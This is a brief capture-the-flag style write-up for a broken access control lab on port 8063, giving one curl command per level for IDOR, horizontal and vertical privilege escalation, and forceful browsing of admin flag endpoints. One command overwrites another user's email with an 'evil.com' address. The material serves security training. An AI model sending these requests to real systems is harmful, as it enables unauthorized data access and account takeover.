# Broken Access Control Lab - Writeup
## Port: 8063 | Kategori: Broken Access Control

## Level 1: IDOR
curl http://target:8063/api/users/2 -H "Authorization: Bearer TOKEN"

## Level 2: Horizontal Privilege Escalation
curl -X PUT http://target:8063/api/users/2 -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"email":"hacked@evil.com"}'

## Level 3: Vertical Privilege Escalation
curl -X POST http://target:8063/api/admin/flag -H "Authorization: Bearer TOKEN"

## Level 4: Forceful Browsing
curl http://target:8063/api/admin/debug/flag
